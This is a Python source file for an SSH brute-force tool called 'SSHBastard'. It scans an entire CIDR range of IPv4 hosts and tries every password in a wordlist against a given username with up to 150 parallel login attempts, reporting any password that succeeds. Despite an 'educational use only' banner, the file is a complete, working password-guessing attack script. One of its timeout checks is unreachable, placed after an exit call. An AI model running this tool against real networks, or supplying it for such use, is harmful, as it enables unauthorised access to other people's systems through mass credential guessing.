# -*- coding: utf-8 -*-
# Author: calfcrusher@inventati.org

import argparse
import os
import time
import threading
import ipaddress
import sys

from pexpect import pxssh
from termcolor import colored

maxConnections = 150
connection_lock = threading.BoundedSemaphore(value=maxConnections)

Found = False
Fails = 0


def connect(host, user, password, release=True):
    """Connect to ssh function"""

    global Found
    global Fails

    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print(colored('[+] Password FOUND: ' + password + " for user " + user + " on " + host, 'red'))
        Found = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()


def main():
    """Main function of tool"""

    parser = argparse.ArgumentParser(usage='python3 SSHBastard.py CIDR -u USER -f PASSFILE')
    parser.add_argument('cidr', type=str, metavar='CIDR', help="set target CIDR")
    parser.add_argument('-u', type=str, metavar='USERNAME', required=True, help='set user name')
    parser.add_argument('-f', type=str, metavar='PASSWD_FILE', required=True, help='set passwords file')

    args = parser.parse_args()
    target_cidr = args.cidr
    passwd_file = args.f
    user = args.u

    print("""\033[91m

             █▀ █▀ █░█ █▄▄ ▄▀█ █▀ ▀█▀ ▄▀█ █▀█ █▀▄
             ▄█ ▄█ █▀█ █▄█ █▀█ ▄█ ░█░ █▀█ █▀▄ █▄▀     

       calfcrusher@inventati.org | For educational use only
    \x1b[0m""")

    # animation = ["10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"]
    animation = ["\t\t\t[■□□□□□□□□□]", "\t\t\t[■■□□□□□□□□]", "\t\t\t[■■■□□□□□□□]", "\t\t\t[■■■■□□□□□□]", "\t\t\t["
                                                                                                         "■■■■■□□□□□]",
                 "\t\t\t[■■■■■■□□□□]", "\t\t\t[■■■■■■■□□□]", "\t\t\t[■■■■■■■■□□]", "\t\t\t[■■■■■■■■■□]",
                 "\t\t\t[■■■■■■■■■■]"]

    for i in range(len(animation)):
        time.sleep(0.3)
        sys.stdout.write("\r" + animation[i % len(animation)])
        sys.stdout.flush()

    print("\n")

    with open(passwd_file) as file:
        for line in file.readlines():
            for ip in ipaddress.IPv4Network(target_cidr):
                if Found:
                    exit(0)
                    if Fails > 5:
                        print("[!] Exiting: Too Many Socket Timeouts")
                        exit(0)
                connection_lock.acquire()
                password = line.strip('\r').strip('\n')
                print("[-] Testing: " + str(password) + " for user " + user + " on host " + str(ip))
                t = threading.Thread(target=connect, args=(str(ip), user, password))
                t.start()


if __name__ == '__main__':
    os.system("clear")
    main()
